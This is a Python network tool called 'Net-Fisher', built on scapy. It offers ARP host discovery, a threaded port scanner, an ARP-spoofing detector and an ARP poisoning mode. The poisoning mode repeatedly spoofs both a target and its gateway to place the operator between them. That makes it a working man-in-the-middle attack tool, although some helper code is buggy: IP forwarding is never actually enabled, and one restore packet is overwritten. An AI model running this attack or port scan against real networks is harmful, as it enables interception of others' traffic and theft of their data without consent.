from colorama import Fore
from scapy.all import *
import time,threading
from prettytable import PrettyTable
from os import *
from mac_vendor_lookup import MacLookup

banner='''
 _   _      _        _____ _      _               
| \ | | ___| |_     |  ___(_) ___| |__   ___ _ __ 
|  \| |/ _ \ __|____| |_  | |/ __| '_ \ / _ \ '__|
| |\  |  __/ ||_____|  _| | |\__ \ | | |  __/ |   
|_| \_|\___|\__|    |_|   |_||___/_| |_|\___|_|  
=================================================
          Developed By Crack_Pathan
'''
Green=Fore.GREEN
red=Fore.RED
yellow=Fore.LIGHTYELLOW_EX
Reset=Fore.RESET
print(f"{yellow}{banner}{Reset}")
print("1: Host Discovering \n2: Arp Spoofing \n3: Port Scanning \n4: MITM Detector")
select_num = input(f"{Green}>>>{Reset} ")
def get_mac(ip):
    pkt=Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip)
    ans,_ = srp(pkt,timeout=2,verbose=0)
    if ans:
        return ans[0][1].src
if select_num == '1':
    system_Host=popen("whoami").read()
    system_ip=popen("ifconfig wlan0 | grep netmask | awk  '{ print $2 }'").read()
    print(f"Host: {system_Host}\nIP: {system_ip}")
    Host=input(f"{yellow}Enter The Range i.e (192.168.0.0/16):==> ")
    start_time=time.time()
    alive={}    
    layer1=Ether()
    layer2=ARP()
    pkt=layer1/layer2
    pkt[Ether].dst="ff:ff:ff:ff:ff:ff"
    pkt[ARP].pdst=Host
    ans,unans = srp(pkt,timeout=2,verbose=False)
    if ans:
        pass
    else:
        print(" ")
        print("==============")
        print("NO HOST Alive")
        print("==============")
        exit(0)
    for send,receive in ans:
        alive[receive.psrc]=receive.hwsrc
    table=PrettyTable(["IP","MAC","Vendor"])
    for ip,mac in alive.items():
        try:
            table.add_row([ip,mac,MacLookup.lookup(mac)])
        except:
            table.add_row([ip,mac,"Unknown"])
    print(table)  
    end_time=time.time()
    print(f"Time esaped: {round((end_time-start_time),3)}")
######################################################################
elif select_num == '2':
    #ARP Poisoning...
    def ip_forwarding():
        file="/proc/sys/net/ipv4/ip_forward"
        with open(file) as f:
            if f.read() == 1:
                print(f'{yellow}IP FORWARDING ALREADY ENABLED')
            else:
                print(f"{yellow}IP FORWARD ENABLING...")
        with open(file,'w') as f:
            f.write("1")
###########################
#################################
    def spoofing(target_ip,gatway_ip):
        target_mac=get_mac(target_ip)
        spoof_packet=ARP(psrc=gatway_ip,pdst=target_ip,op="is-at",hwdst=target_mac) # HERE NOT SPECIFING SOURCE_MAC (b/c ITS SETUP DEFAULT)
        send(spoof_packet,verbose=0)
        mac=ARP().hwsrc
        print(f"{Green}[+] {gatway_ip} is-at {mac}")
################################
    def restoring(target_ip,gatway_ip):
        target_mac=get_mac(target_ip)
        gatway_mac=get_mac(gatway_ip)
        spoof_packet=ARP(psrc=gatway_ip,pdst=target_ip,op="is-at",hwdst=target_mac,hwsrc=gatway_mac) # FOR RESTORING ARP-TABLE WE MUST SPECIFY LEGITEMATE SOURCE MAC ADDRESS
        spoof_packet=ARP(psrc=target_ip,pdst=gatway_ip,op="is-at",hwdst=target_mac,hwsrc=target_mac)
        send(spoof_packet,verbose=0)
        print(f"{yellow}[+] {gatway_ip} is-at {gatway_mac}")
        print(f"{yellow}[+] {target_ip} is-at {target_mac}")

    if __name__ == "__main__":
        #gatway_ip=popen("route -n | awk  '{ print $2 }' | grep 1").read()
        gatway_ip=input(f'{yellow}Enter gatway IP :==> ')
        target_ip=input(f'{yellow}Enter Target IP :==> ')
        ip_forwarding
        try:
            while True:
                spoofing(target_ip,gatway_ip)
                spoofing(gatway_ip,target_ip)
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"{red}CTRL-C DETECTED: [+] Restoring ARP-Table")
            restoring(target_ip,gatway_ip)
#############################################
elif select_num == '3':
    #port scanning....
    aliveHost=[]
    Host=input("Enter the HOST IP: ")
    stime=time.time()

    def speedster (port):
        pkt=IP(dst=Host)/TCP(dport=port)
        answer,unanswer = sr(pkt,timeout=1,verbose=False)
        for request,replies in answer:
            if replies[TCP].flags == "SA":
                aliveHost.append(replies.sport)
    for i in range(21,1001):
        thread=threading.Thread(target=speedster,args=(i,))
        thread.start() 
    time.sleep(2)   
    if not aliveHost:
        print("PORTS ARE CLOSE/FILTER")
    else:
        print(Host,"\n")
        ptty_table=PrettyTable(["Port","Status"])
        for i in aliveHost:
            ptty_table.add_row([i,"Open"])
        print(ptty_table)
    edtime=time.time()
    print(f"Time escaped: {round(edtime-stime,3)}")
elif select_num == '4':
    # MITM Detector...
    def detector(packet):
        if packet[ARP].op == 2:# 1 for who-has (request), 2 for is-at (response) 
            real_mac = get_mac(packet[ARP].psrc) # Getting the real mac_address
            if real_mac != (packet[ARP].hwsrc):
                print(f"{red}[+] Your Are Under ATTACK :( Real MAC: {real_mac} Fack MAC: {packet[ARP].hwsrc} ")
            else:
                pass
    print("script is RUNNING ...")
    sniff(filter="arp",prn=detector,store=False)
else:
    print(red,'PLEASE SELECT PROPERLY')